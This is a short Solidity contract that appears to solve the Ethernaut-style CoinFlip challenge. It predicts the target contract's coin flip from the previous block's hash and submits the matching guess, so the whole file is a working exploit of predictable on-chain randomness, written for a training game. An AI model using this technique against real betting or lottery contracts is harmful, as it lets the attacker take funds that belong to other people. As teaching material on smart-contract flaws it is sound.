// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipHack {

    CoinFlip target;
    
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function flip() public {

        uint blockValue = uint256(blockhash(block.number - 1));

        uint coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }

}
